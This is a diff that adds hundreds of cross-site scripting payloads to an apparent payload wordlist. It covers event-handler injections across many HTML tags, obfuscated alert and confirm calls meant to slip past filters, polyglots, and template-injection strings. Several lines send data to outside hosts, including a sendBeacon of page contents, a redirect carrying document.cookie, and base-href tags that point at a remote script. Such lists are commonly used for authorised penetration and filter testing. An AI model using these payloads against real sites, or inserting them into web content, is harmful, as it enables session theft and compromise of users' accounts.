+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe2 id=x style="position:absolute;" onanimationcancel="print()"></iframe2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style="position:absolute;" onanimationcancel="print()"></image>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image2 id=x style="position:absolute;" onanimationcancel="print()"></image2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image3 id=x style="position:absolute;" onanimationcancel="print()"></image3>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style="position:absolute;" onanimationcancel="print()"></img>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img2 id=x style="position:absolute;" onanimationcancel="print()"></img2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style="position:absolute;" onanimationcancel="print()"></input>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input2 id=x style="position:absolute;" onanimationcancel="print()"></input2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input3 id=x style="position:absolute;" onanimationcancel="print()"></input3>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input4 id=x style="position:absolute;" onanimationcancel="print()"></input4>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style="position:absolute;" onanimationcancel="print()"></ins>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style="position:absolute;" onanimationcancel="print()"></kbd>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style="position:absolute;" onanimationcancel="print()"></keygen>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style="position:absolute;" onanimationcancel="print()"></label>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style="position:absolute;" onanimationcancel="print()"></legend>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style="position:absolute;" onanimationcancel="print()"></li>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style="position:absolute;" onanimationcancel="print()"></link>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style="position:absolute;" onanimationcancel="print()"></listing>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><main id=x style="position:absolute;" onanimationcancel="print()"></main>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style="position:absolute;" onanimationcancel="print()"></map>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style="position:absolute;" onanimationcancel="print()"></mark>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style="position:absolute;" onanimationcancel="print()"></marquee>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style="position:absolute;" onanimationcancel="print()"></menu>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style="position:absolute;" onanimationcancel="print()"></menuitem>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style="position:absolute;" onanimationcancel="print()"></meta>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style="position:absolute;" onanimationcancel="print()"></meter>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style="position:absolute;" onanimationcancel="print()"></multicol>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style="position:absolute;" onanimationcancel="print()"></nav>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style="position:absolute;" onanimationcancel="print()"></nextid>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style="position:absolute;" onanimationcancel="print()"></nobr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style="position:absolute;" onanimationcancel="print()"></noembed>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style="position:absolute;" onanimationcancel="print()"></noframes>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style="position:absolute;" onanimationcancel="print()"></noscript>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style="position:absolute;" onanimationcancel="print()"></object>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style="position:absolute;" onanimationcancel="print()"></ol>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style="position:absolute;" onanimationcancel="print()"></optgroup>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style="position:absolute;" onanimationcancel="print()"></option>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style="position:absolute;" onanimationcancel="print()"></output>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style="position:absolute;" onanimationcancel="print()"></p>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style="position:absolute;" onanimationcancel="print()"></param>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style="position:absolute;" onanimationcancel="print()"></picture>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style="position:absolute;" onanimationcancel="print()"></plaintext>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style="position:absolute;" onanimationcancel="print()"></pre>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style="position:absolute;" onanimationcancel="print()"></progress>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style="position:absolute;" onanimationcancel="print()"></q>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style="position:absolute;" onanimationcancel="print()"></rb>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style="position:absolute;" onanimationcancel="print()"></rp>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style="position:absolute;" onanimationcancel="print()"></rt>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style="position:absolute;" onanimationcancel="print()"></rtc>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style="position:absolute;" onanimationcancel="print()"></ruby>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style="position:absolute;" onanimationcancel="print()"></s>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style="position:absolute;" onanimationcancel="print()"></samp>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style="position:absolute;" onanimationcancel="print()"></script>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style="position:absolute;" onanimationcancel="print()"></section>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style="position:absolute;" onanimationcancel="print()"></select>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><set id=x style="position:absolute;" onanimationcancel="print()"></set>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style="position:absolute;" onanimationcancel="print()"></shadow>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style="position:absolute;" onanimationcancel="print()"></slot>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style="position:absolute;" onanimationcancel="print()"></small>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style="position:absolute;" onanimationcancel="print()"></source>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style="position:absolute;" onanimationcancel="print()"></spacer>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style="position:absolute;" onanimationcancel="print()"></span>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strike id=x style="position:absolute;" onanimationcancel="print()"></strike>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style="position:absolute;" onanimationcancel="print()"></strong>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style="position:absolute;" onanimationcancel="print()"></style>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style="position:absolute;" onanimationcancel="print()"></sub>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style="position:absolute;" onanimationcancel="print()"></summary>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style="position:absolute;" onanimationcancel="print()"></sup>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style="position:absolute;" onanimationcancel="print()"></svg>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style="position:absolute;" onanimationcancel="print()"></table>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style="position:absolute;" onanimationcancel="print()"></tbody>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style="position:absolute;" onanimationcancel="print()"></td>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style="position:absolute;" onanimationcancel="print()"></template>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style="position:absolute;" onanimationcancel="print()"></textarea>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style="position:absolute;" onanimationcancel="print()"></tfoot>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style="position:absolute;" onanimationcancel="print()"></th>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style="position:absolute;" onanimationcancel="print()"></thead>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style="position:absolute;" onanimationcancel="print()"></time>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style="position:absolute;" onanimationcancel="print()"></title>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style="position:absolute;" onanimationcancel="print()"></tr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style="position:absolute;" onanimationcancel="print()"></track>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style="position:absolute;" onanimationcancel="print()"></tt>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style="position:absolute;" onanimationcancel="print()"></u>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style="position:absolute;" onanimationcancel="print()"></ul>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><var id=x style="position:absolute;" onanimationcancel="print()"></var>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style="position:absolute;" onanimationcancel="print()"></video>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video2 id=x style="position:absolute;" onanimationcancel="print()"></video2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style="position:absolute;" onanimationcancel="print()"></wbr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="print()"></xmp>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+<style>@keyframes x{}</style><geolocation style="animation-name:x" onanimationend="alert(1)"></geolocation>
+<style>@keyframes x{}</style><geolocation style="animation-name:x" onanimationstart="alert(1)"></geolocation>
+<style>@keyframes x{}</style><geolocation style="animation-name:x" onwebkitanimationend="alert(1)"></geolocation>
+<style>@keyframes x{}</style><geolocation style="animation-name:x" onwebkitanimationstart="alert(1)"></geolocation>
+<sub id=x onbeforematch=alert(1) hidden=until-found>
+<sub onbeforepaste=alert(1)>XSS</sub>
+<sub onsecuritypolicyviolation=alert(1)>XSS</sub>
+<sub ontouchcancel=alert(1)>XSS</sub>
+<summary id=x onbeforematch=alert(1) hidden=until-found>
+<summary onbeforepaste=alert(1)>XSS</summary>
+<summary onsecuritypolicyviolation=alert(1)>XSS</summary>
+<summary ontouchcancel=alert(1)>XSS</summary>
+<sup id=x onbeforematch=alert(1) hidden=until-found>
+<sup onbeforepaste=alert(1)>XSS</sup>
+<sup onsecuritypolicyviolation=alert(1)>XSS</sup>
+<sup ontouchcancel=alert(1)>XSS</sup>
+<svg id=x onbeforematch=alert(1) hidden=until-found>
+<svg onbeforepaste=alert(1)>XSS</svg>
+<svg onload="attributes[0].value=name,new onload">
+<svg onload="throw top.onerror=eval,'/*'+URL">
+<svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}">
+<svg onload=alert(1)<!--
+<svg onload=innerHTML=URL,eval(textContent)>
+<svg onload=innerHTML=URL,innerHTML=textContent>
+<svg onload=onerror=eval;new'"-alert\x281\x29//'>
+<svg onsecuritypolicyviolation=alert(1)>XSS</svg>
+<svg ontouchcancel=alert(1)>XSS</svg>
+<svg onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<svg><a xlink:href="javascript:alert(1)">
+<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
+<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1)>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><set xlink:href=#x attributeName=href to=javascript:alert(1)>
+<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
+<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+<table id=x onbeforematch=alert(1) hidden=until-found>
+<table onbeforepaste=alert(1)>XSS</table>
+<table onsecuritypolicyviolation=alert(1)>XSS</table>
+<table ontouchcancel=alert(1)>XSS</table>
+<tbody id=x onbeforematch=alert(1) hidden=until-found>
+<tbody onbeforepaste=alert(1)>XSS</tbody>
+<tbody onsecuritypolicyviolation=alert(1)>XSS</tbody>
+<tbody ontouchcancel=alert(1)>XSS</tbody>
+<td id=x onbeforematch=alert(1) hidden=until-found>
+<td onbeforepaste=alert(1)>XSS</td>
+<td onsecuritypolicyviolation=alert(1)>XSS</td>
+<td ontouchcancel=alert(1)>XSS</td>
+<template id=x onbeforematch=alert(1) hidden=until-found>
+<template onbeforepaste=alert(1)>XSS</template>
+<template onsecuritypolicyviolation=alert(1)>XSS</template>
+<template ontouchcancel=alert(1)>XSS</template>
+<textarea id=x onbeforematch=alert(1) hidden=until-found>
+<textarea onbeforepaste=alert(1)>XSS</textarea>
+<textarea onsecuritypolicyviolation=alert(1)>XSS</textarea>
+<textarea ontouchcancel=alert(1)>XSS</textarea>
+<tfoot id=x onbeforematch=alert(1) hidden=until-found>
+<tfoot onbeforepaste=alert(1)>XSS</tfoot>
+<tfoot onsecuritypolicyviolation=alert(1)>XSS</tfoot>
+<tfoot ontouchcancel=alert(1)>XSS</tfoot>
+<th id=x onbeforematch=alert(1) hidden=until-found>
+<th onbeforepaste=alert(1)>XSS</th>
+<th onsecuritypolicyviolation=alert(1)>XSS</th>
+<th ontouchcancel=alert(1)>XSS</th>
+<thead id=x onbeforematch=alert(1) hidden=until-found>
+<thead onbeforepaste=alert(1)>XSS</thead>
+<thead onsecuritypolicyviolation=alert(1)>XSS</thead>
+<thead ontouchcancel=alert(1)>XSS</thead>
+<time id=x onbeforematch=alert(1) hidden=until-found>
+<time onbeforepaste=alert(1)>XSS</time>
+<time onsecuritypolicyviolation=alert(1)>XSS</time>
+<time ontouchcancel=alert(1)>XSS</time>
+<title id=x onbeforematch=alert(1) hidden=until-found>
+<title onbeforepaste=alert(1)>XSS</title>
+<title onsecuritypolicyviolation=alert(1)>XSS</title>
+<title ontouchcancel=alert(1)>XSS</title>
+<tr id=x onbeforematch=alert(1) hidden=until-found>
+<tr onbeforepaste=alert(1)>XSS</tr>
+<tr onsecuritypolicyviolation=alert(1)>XSS</tr>
+<tr ontouchcancel=alert(1)>XSS</tr>
+<track id=x onbeforematch=alert(1) hidden=until-found>
+<track onbeforepaste=alert(1)>XSS</track>
+<track onsecuritypolicyviolation=alert(1)>XSS</track>
+<track ontouchcancel=alert(1)>XSS</track>
+<tt id=x onbeforematch=alert(1) hidden=until-found>
+<tt onbeforepaste=alert(1)>XSS</tt>
+<tt onsecuritypolicyviolation=alert(1)>XSS</tt>
+<tt ontouchcancel=alert(1)>XSS</tt>
+<u id=x onbeforematch=alert(1) hidden=until-found>
+<u onbeforepaste=alert(1)>XSS</u>
+<u onsecuritypolicyviolation=alert(1)>XSS</u>
+<u ontouchcancel=alert(1)>XSS</u>
+<ul id=x onbeforematch=alert(1) hidden=until-found>
+<ul onbeforepaste=alert(1)>XSS</ul>
+<ul onsecuritypolicyviolation=alert(1)>XSS</ul>
+<ul ontouchcancel=alert(1)>XSS</ul>
+<var id=x onbeforematch=alert(1) hidden=until-found>
+<var onbeforepaste=alert(1)>XSS</var>
+<var onsecuritypolicyviolation=alert(1)>XSS</var>
+<var ontouchcancel=alert(1)>XSS</var>
+<video controls onwaiting=alert(1)><source src=x type=x></video>
+<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>
+<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE100:00:00.000 --> 00:00:05.000 <b>XSS</b>"></video>
+<video id=x onbeforematch=alert(1) hidden=until-found>
+<video onbeforepaste=alert(1)>XSS</video>
+<video onsecuritypolicyviolation=alert(1)>XSS</video>
+<video ontouchcancel=alert(1)>XSS</video>
+<video2 id=x onbeforematch=alert(1) hidden=until-found>
+<video2 onbeforepaste=alert(1)>XSS</video2>
+<video2 onsecuritypolicyviolation=alert(1)>XSS</video2>
+<video2 ontouchcancel=alert(1)>XSS</video2>
+<video><source onerror=location=/\02.rs/+document.cookie>
+<wbr id=x onbeforematch=alert(1) hidden=until-found>
+<wbr onbeforepaste=alert(1)>XSS</wbr>
+<wbr onsecuritypolicyviolation=alert(1)>XSS</wbr>
+<wbr ontouchcancel=alert(1)>XSS</wbr>
+<x onafterscriptexecute=alert(1)><script>1</script>
+<x onbeforescriptexecute=alert(1)><script>1</script>
+<xmp id=x onbeforematch=alert(1) hidden=until-found>
+<xmp onbeforepaste=alert(1)>XSS</xmp>
+<xmp onsecuritypolicyviolation=alert(1)>XSS</xmp>
+<xmp ontouchcancel=alert(1)>XSS</xmp>
+<xss class="carousel slide" data-interval=100 ontransitionend=alert(1)>
+<xss contenteditable onbeforeinput=alert(1)>test
+<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>
+<xss id=x onbeforematch=alert(1) hidden=until-found>
+<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
+<xss onbeforepaste=alert(1)>XSS</xss>
+<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
+<xss oncontextmenu="alert(1)" style=display:block>test</xss>
+<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
+<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>
+<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
+<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>
+<xss onmousedown="alert(1)" style=display:block>test</xss>
+<xss onmouseenter="alert(1)" style=display:block>test</xss>
+<xss onmouseleave="alert(1)" style=display:block>test</xss>
+<xss onmousemove="alert(1)" style=display:block>test</xss>
+<xss onmouseout="alert(1)" style=display:block>test</xss>
+<xss onmouseover="alert(1)" style=display:block>test</xss>
+<xss onmouseup="alert(1)" style=display:block>test</xss>
+<xss onmousewheel=alert(1) style=display:block>requires scrolling
+<xss onpointercancel=alert(1)>XSS</xss>
+<xss onpointerdown=alert(1) style=display:block>XSS</xss>
+<xss onpointerenter=alert(1) style=display:block>XSS</xss>
+<xss onpointerleave=alert(1) style=display:block>XSS</xss>
+<xss onpointermove=alert(1) style=display:block>XSS</xss>
+<xss onpointerout=alert(1) style=display:block>XSS</xss>
+<xss onpointerover=alert(1) style=display:block>XSS</xss>
+<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>
+<xss onpointerup=alert(1) style=display:block>XSS</xss>
+<xss onsecuritypolicyviolation=alert(1)>XSS</xss>
+<xss ontouchcancel=alert(1)>XSS</xss>
+<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>
+<xss onwebkitmouseforcedown=alert(1)>XSS</xss>
+<xss onwebkitmouseforceup=alert(1)>XSS</xss>
+<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>
+<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>
+exp/*<A STYLE='no\xss:noxss("*//*");
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=alert()//>
+javascript:/*--></title></style></textarea></script></xmp>
+top[/al/.source+/ert/.source](1)
+top[8680439..toString(30)](1)
+top[‘al\145rt’](1)
+top[“al”+”ert”](1)
+x<template shadowrootmode=open><slot onslotchange=alert(1)>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
@@ -18992,13 +20488,13 @@ Set.constructor`al\x65rt\x2814\x29```;
 {{this.constructor('alert(document.domain)')()}}
 {{['x'].shift.constructor('alert(1)')()}}
 {{globalThis.constructor("alert(1)")()}}
-JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->
-JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->
-<svg/onload=/*${/*/;{/**/window['c'+'o'+'n'+'f'+'i'+'r'+'m'](1)}//><Base/Href=//rix4uni.ez.pe-->
-<video><source onerror=/*${/*/;{/**/window[String.fromCharCode(99,111,110,102,105,114,109)](1)}//><Base/Href=//rix4uni.ez.pe-->
-<select onfocus=/*${/*/;{/**/window['\u0063'+'\u006f'+'\u006e'+'\u0066'+'\u0069'+'\u0072'+'\u006d'](1)}//><Base/Href=//rix4uni.ez.pe-->
-<textarea onfocus=/*${/*/;{/**/top[atob('Y29uZmlybQ==')](1)}//><Base/Href=//rix4uni.ez.pe-->
-<input autofocus onfocus=/*${/*/;{/**/parent['mrifnoc'.split('').reverse().join('')](1)}//><Base/Href=//rix4uni.ez.pe-->
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
+<svg/onload=/*${/*/;{/**/window['c'+'o'+'n'+'f'+'i'+'r'+'m'](1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
+<video><source onerror=/*${/*/;{/**/window[String.fromCharCode(99,111,110,102,105,114,109)](1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
+<select onfocus=/*${/*/;{/**/window['\u0063'+'\u006f'+'\u006e'+'\u0066'+'\u0069'+'\u0072'+'\u006d'](1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
+<textarea onfocus=/*${/*/;{/**/top[atob('Y29uZmlybQ==')](1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
